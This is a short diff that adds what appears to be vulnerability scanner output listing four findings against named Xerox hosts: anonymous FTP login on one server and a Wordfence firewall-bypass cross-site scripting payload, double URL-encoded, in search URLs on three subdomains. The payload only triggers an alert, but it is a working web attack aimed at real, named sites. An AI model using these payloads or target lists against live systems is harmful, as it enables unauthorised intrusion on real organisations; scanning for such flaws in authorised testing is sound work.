@@ -1,0 +1,4 @@
+[ftp-anonymous-login] [tcp] [medium] www.xrci.xerox.com:21
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://xbs-uk-advanced-uk-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://xbs-uk-altodigital-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://xbs-uk-itecgroup-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
